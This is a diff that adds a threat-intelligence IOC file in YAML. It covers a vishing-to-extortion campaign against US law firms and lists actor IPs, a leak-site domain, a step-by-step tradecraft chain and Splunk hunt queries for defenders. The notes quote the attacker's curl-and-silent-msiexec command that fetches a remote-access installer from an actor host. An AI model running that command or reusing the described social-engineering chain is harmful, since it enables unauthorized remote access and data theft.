@@ -1,0 +1,337 @@
+# threats/iocs/unattributed/unc3753-luna-moth-srg-us-law-firms-2026-06-17.yaml
+#
+# Unattributed cluster — IOCs published by Mandiant / GTIG (Reams,
+# Ahmed, Knapp, Frazer, McLellan; 2026-06-05) covering UNC3753 /
+# Luna Moth / Chatty Spider / Silent Ransom Group (SRG) operations
+# against US legal / professional / financial services firms,
+# January through May 2026.
+#
+# Filed UNATTRIBUTED per Hard Rule 2 because UNC3753 is NOT on the
+# 24-actor `_roster.yaml`. Mandiant primary attribution to the
+# UNC3753 cluster (with aliases Luna Moth / Chatty Spider / SRG)
+# is preserved VERBATIM as published. Archimedes does NOT
+# originate attribution and does NOT propagate the alias chain
+# beyond what Mandiant published. Operator-deferred `/new-actor`
+# candidacy is recorded; once an actor dossier is scaffolded, these
+# indicators may migrate to the actor-attributed iocs.yaml.
+
+cluster_id: unc3753-luna-moth-srg-us-law-firms-2026-06-17
+cluster_name: "UNC3753 / Luna Moth / Chatty Spider / Silent Ransom Group — US Law Firms vishing-to-extortion campaign (Mandiant Jan-May 2026)"
+first_seen: 2026-01
+last_updated: 2026-06-17
+admiralty_grade: A2
+tlp: CLEAR
+
+provenance:
+  - source: finding-2026-06-17-0003-mandiant-direct-page-title-snapshot-us-law-firms-targeted-campaign-knowledgedeliver-viewstate-net-new-substrate-title-only
+    note: >
+      Mandiant / GTIG five-named-author byline (Chad Reams, Tufail Ahmed,
+      Keith Knapp, Ashley Frazer, Tyler McLellan; published 2026-06-05)
+      attributes a financially-motivated data-theft-extortion campaign
+      to the UNC3753 cluster with aliases Luna Moth, Chatty Spider,
+      Silent Ransom Group (SRG). TTP overlap with UNC2686 ("Bazarcall"-
+      style campaigns dating to early 2021). Active since at least
+      March 2022; deployed LOCKBIT.BLACK in 2022; shifted from
+      subscription-themed billing email lures to IT-helpdesk
+      impersonation around March 2025.
+
+      Mandiant attribution is single-IR-vendor on the UNC3753 cluster
+      identity; the campaign body is the substantiation of the
+      morning-brief title-snapshot finding (finding-2026-06-17-0003).
+      Filed unattributed pending operator `/new-actor` decision.
+
+notes: |
+  Campaign window: January through May 2026.
+  Targeting: US legal services (primary), professional services,
+  financial services. Mandiant does NOT name A&D-prime victims.
+  A&D-supply-chain-adjacent via outside-counsel pathway (ITAR /
+  export-control / IP-litigation counsel).
+
+  Operational template:
+    1. Email lure — invoice-themed, non-malicious, from actor-
+       controlled consumer email; designed to raise the target's
+       internal security antennae so the follow-up vishing call
+       lands credibly.
+    2. Voice phishing — IT-helpdesk / security-team impersonation;
+       pretexts include data-migration projects and security-issue
+       remediation; goal is to direct the target into screen-sharing.
+    3. Screen-sharing utilities — Zoom, Microsoft Terminal Services,
+       Microsoft Teams, Quick Assist.
+    4. Commercial RMM deployment — AnyDesk, Bomgar, Zoho Assist,
+       SuperOps RMM. SuperOps observed deployed via cURL +
+       msiexec /quiet:
+         curl -sL "http://<actor-ip>/installer" -o "SuperOps.msi"
+         && msiexec /i "SuperOps.msi" /quiet
+    5. Delivery mechanism — Privnote (privnote[.]com) self-
+       destructing text utility for installation links / commands.
+    6. Infrastructure pivot — BYOD compromise (personal laptops) +
+       VDI access via Windows 365 (Windows365.exe), Citrix clients.
+    7. File-system pivot — local directories, active OneDrive
+       folders, mapped network drives; iManage / SharePoint /
+       OneDrive keyword search for tax logs (W-2/W-9/1099), audit
+       files, corporate client agreements, SSNs.
+    8. Staging — compile/sort within target-accessible
+       subdirectories (Downloads, Roaming profile).
+    9. Exfiltration — drag-and-drop into actor-controlled consumer
+       file-sharing accounts (Google Drive), Portable WinSCP,
+       Rclone. One observed incident: 1.7 GB to Google Drive then
+       VDI pivot + 14.4 GB via WinSCP.
+    10. Email-mailbox staging — instructed victims to forward iManage
+        files to actor-controlled consumer emails from the target's
+        own mailbox.
+    11. Physical office intrusions — individuals posing as IT
+        technicians attempting USB exfiltration. Mandiant: "limited
+        forensic evidence and absence of subsequent extortion
+        attempts prevent formal attribution; however, physical
+        intrusions likely associated with UNC3753 based on
+        structural, timeline, and targeting overlaps."
+    12. Extortion — email contact within ~30 minutes of exit; three-
+        day response window; escalation via direct calls/emails to
+        employees, external client contact, LEAKEDDATA DLS publication.
+
+  A&D defensive posture:
+    - Outside-counsel exposure is real and structural; firm-side
+      controls (BYOD/VDI conditional access, RMM block-list, USB
+      hardening, physical visitor verification) are operator-
+      applicable to A&D primes and their outside-counsel partners.
+    - The tradecraft template is highly portable. Even absent
+      direct A&D-prime victimization, A&D defenders running
+      BYOD/VDI environments should validate that conditional
+      access restricts to corporate-owned devices and that RMM
+      controls block unauthorized AnyDesk / Bomgar / Zoho Assist
+      / SuperOps installs.
+
+  Splunk first-party status at finding publication (2026-06-17
+  16:00 EDT afternoon brief): clean over -6h on the combined
+  46-IOC standing set + this cluster's net-new IOCs across
+  defenseclaw_local and archimedes (excluding self-telemetry
+  sourcetypes). Hard Rule 8 — silence is NOT disconfirming.
+  Frank is NOT a US legal / professional / financial services
+  firm; visibility-limited absence flagged not negative-evidence.
+
+  Migration to actor-attributed iocs.yaml:
+    - Operator approves `/new-actor UNC3753` candidacy and
+      actor dossier is scaffolded; cluster migrates to
+      threats/threat-actors/<NNN>-unc3753/iocs.yaml.
+    - Independent A-grade IR-vendor (CrowdStrike / Unit 42 /
+      Volexity / MSTIC) corroborates the Luna Moth / Chatty
+      Spider / SRG alias chain with second-vendor attribution
+      language firmer than Mandiant's primary.
+    - First-party Splunk hit on these IOCs.
+
+ttl:
+  network_infrastructure: 90   # days; IPs in commodity hosting may rotate
+  data_leak_site: 365          # DLS infrastructure longer-lived
+  hashes: never
+  template_pattern: 730        # phishing-domain naming convention durable
+
+indicators:
+  - id: unc3753-ipv4-001
+    type: ipv4
+    value: 192.236.147.131
+    role: actor_infrastructure
+    description: "UNC3753 actor-controlled IPv4 per Mandiant primary"
+    first_seen: 2026-01
+    last_seen: 2026-05
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG"]
+
+  - id: unc3753-ipv4-002
+    type: ipv4
+    value: 192.236.147.138
+    role: actor_infrastructure
+    description: "UNC3753 actor-controlled IPv4 per Mandiant primary; same /24 as .131"
+    first_seen: 2026-01
+    last_seen: 2026-05
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG"]
+
+  - id: unc3753-ipv4-003
+    type: ipv4
+    value: 193.141.60.212
+    role: actor_infrastructure
+    description: "UNC3753 actor-controlled IPv4 per Mandiant primary"
+    first_seen: 2026-01
+    last_seen: 2026-05
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG"]
+
+  - id: unc3753-ipv4-004
+    type: ipv4
+    value: 192.236.154.158
+    role: actor_infrastructure
+    description: "UNC3753 actor-controlled IPv4 per Mandiant primary"
+    first_seen: 2026-01
+    last_seen: 2026-05
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG"]
+
+  - id: unc3753-ipv4-005
+    type: ipv4
+    value: 192.236.146.173
+    role: actor_infrastructure
+    description: "UNC3753 actor-controlled IPv4 per Mandiant primary"
+    first_seen: 2026-01
+    last_seen: 2026-05
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG"]
+
+  - id: unc3753-ipv4-006
+    type: ipv4
+    value: 174.169.162.62
+    role: actor_infrastructure
+    description: "UNC3753 actor-controlled IPv4 per Mandiant primary"
+    first_seen: 2026-01
+    last_seen: 2026-05
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG"]
+
+  - id: unc3753-ipv4-007
+    type: ipv4
+    value: 64.94.84.97
+    role: actor_infrastructure
+    description: "UNC3753 actor-controlled IPv4 per Mandiant primary"
+    first_seen: 2026-01
+    last_seen: 2026-05
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG"]
+
+  - id: unc3753-domain-001
+    type: domain
+    value: business-data-leaks.com
+    role: data_leak_site
+    description: >
+      LEAKEDDATA data-leak-site domain operated by / associated with
+      UNC3753; used to publish stolen data after non-payment of
+      extortion demand. Mandiant primary.
+    first_seen: 2026-01
+    last_seen: 2026-06
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG"]
+
+  - id: unc3753-sha256-001
+    type: sha256
+    value: 598281d2c6de83adf1505ee6077608d0c043623d477e2884d36d65e90686d67a
+    role: gti_collection_anchor
+    description: >
+      Mandiant VirusTotal GTI Collection anchor SHA-256 for the
+      UNC3753 / US Law Firms campaign indicator set. Full collection
+      requires VirusTotal registered-user access. Per Mandiant
+      primary.
+    first_seen: 2026-06-05
+    last_seen: 2026-06-05
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG", "VirusTotal"]
+
+  - id: unc3753-targeting-pattern-001
+    type: targeting_pattern
+    value: "<organization>-itdesk.com / <organization>-it.com / <organization>-helpdesk.com"
+    role: phishing_domain_template
+    description: >
+      Phishing-domain naming convention templated against the victim
+      organization's name. Detection signature: any newly-registered
+      domain matching <yourorg>-itdesk[.]com, <yourorg>-it[.]com, or
+      <yourorg>-helpdesk[.]com warrants immediate review even before
+      an IT-helpdesk vishing call lands. Mandiant primary.
+    first_seen: 2026-01
+    last_seen: 2026-05
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG"]
+
+  - id: unc3753-tradecraft-001
+    type: detection_pattern
+    value: "Voice phishing (vishing) IT-helpdesk impersonation → screen-share (Zoom/Quick Assist/Teams) → commercial RMM install (AnyDesk/Bomgar/Zoho Assist/SuperOps) → BYOD/VDI pivot → iManage/SharePoint/OneDrive keyword exfil → same-day extortion → LEAKEDDATA DLS"
+    role: operational_template
+    description: >
+      End-to-end tradecraft chain documented by Mandiant. Detection
+      signatures along the chain: SuperOps msiexec /quiet child
+      processes spawned from unexpected parents; cURL→msiexec
+      install patterns; Zoom screen-share initiated from outside
+      corporate-owned devices; iManage / SharePoint search-term
+      spikes; high-volume WinSCP / Rclone exfil over port 22 from
+      VDI/internal endpoints.
+    first_seen: 2026-01
+    last_seen: 2026-05
+    source: finding-2026-06-17-0003
+    source_attribution: ["Mandiant / GTIG"]
+
+attribution_claims:
+  - actor_cluster: UNC3753
+    aliases: [Luna Moth, Chatty Spider, Silent Ransom Group, SRG]
+    asserted_by: Mandiant / GTIG
+    asserted_confidence: high (5-named-author byline)
+    ttp_overlap_clusters: [UNC2686]
+    archimedes_position: >
+      Mandiant primary attribution to the UNC3753 cluster and its
+      alias chain is preserved VERBATIM per Hard Rule 2. Archimedes
+      does NOT originate or extend this attribution. UNC3753 is not
+      on the 24-actor _roster.yaml; operator-deferred `/new-actor`
+      candidacy noted.
+
+hunt_queries:
+  - id: unc3753-hunt-actor-ipv4
+    platform: splunk
+    title: "UNC3753 — Mandiant actor IPv4 hunt"
+    query_type: spl
+    query: |
+      index=defenseclaw_local OR index=archimedes
+      (src_ip IN ("192.236.147.131","192.236.147.138","193.141.60.212",
+                  "192.236.154.158","192.236.146.173","174.169.162.62",
+                  "64.94.84.97")
+        OR dest_ip IN ("192.236.147.131","192.236.147.138","193.141.60.212",
+                       "192.236.154.158","192.236.146.173","174.169.162.62",
+                       "64.94.84.97"))
+      | stats count by src_ip, dest_ip, dest_port, _time, sourcetype
+      | sort -_time
+    notes: >
+      Any match warrants immediate investigation. These IPs are
+      Mandiant-attributed actor infrastructure observed across the
+      January-May 2026 UNC3753 campaign.
+
+  - id: unc3753-hunt-leaksite-domain
+    platform: splunk
+    title: "UNC3753 — LEAKEDDATA leak-site DNS / proxy hunt"
+    query_type: spl
+    query: |
+      index=defenseclaw_local OR index=archimedes
+      ("business-data-leaks.com" OR "business-data-leaks[.]com")
+      | stats count by user, src_ip, dest, sourcetype, _time
+      | sort -_time
+    notes: >
+      DNS lookups, proxy logs, or threat-intel feed mentions of the
+      LEAKEDDATA data-leak-site domain. Any internal-user lookup is
+      noteworthy (extortion-checkout pattern).
+
+  - id: unc3753-hunt-phishing-template
+    platform: splunk
+    title: "UNC3753 — phishing-domain template hunt (org-name suffix)"
+    query_type: spl
+    query: |
+      index=defenseclaw_local OR index=archimedes sourcetype=*dns* OR sourcetype=*proxy*
+      (query="*-itdesk.com" OR query="*-it.com" OR query="*-helpdesk.com"
+        OR url="*-itdesk.com*" OR url="*-it.com*" OR url="*-helpdesk.com*")
+      | stats count by query, url, src_ip, _time
+      | sort -_time
+    notes: >
+      Detection signature for the templated phishing-domain naming
+      convention. Match the <yourorg> prefix against Frank's
+      operator-tracked org names. May FP on legitimate vendor
+      domains; correlate with new-registration WHOIS data.
+
+  - id: unc3753-hunt-tradecraft-chain
+    platform: splunk
+    title: "UNC3753 — tradecraft-chain hunt (RMM + cURL + msiexec /quiet)"
+    query_type: spl
+    query: |
+      index=defenseclaw_local OR index=archimedes sourcetype=*process*
+      (process_name IN ("AnyDesk.exe","BomgarRdr.exe","zohoassist.exe",
+                        "SuperOps.exe","SuperOps.msi")
+       OR (process_name="curl.exe" AND command_line="*msiexec*/quiet*")
+       OR (process_name="msiexec.exe" AND command_line="*SuperOps*"))
+      | stats count by host, user, process_name, command_line, _time
+      | sort -_time
+    notes: >
+      Commercial RMM installs are legitimate in many environments;
+      use this as a hunt baseline. Correlate with new-user spawn,
+      after-hours, or remote screen-share session context for
+      higher-confidence detection of the UNC3753 tradecraft chain.
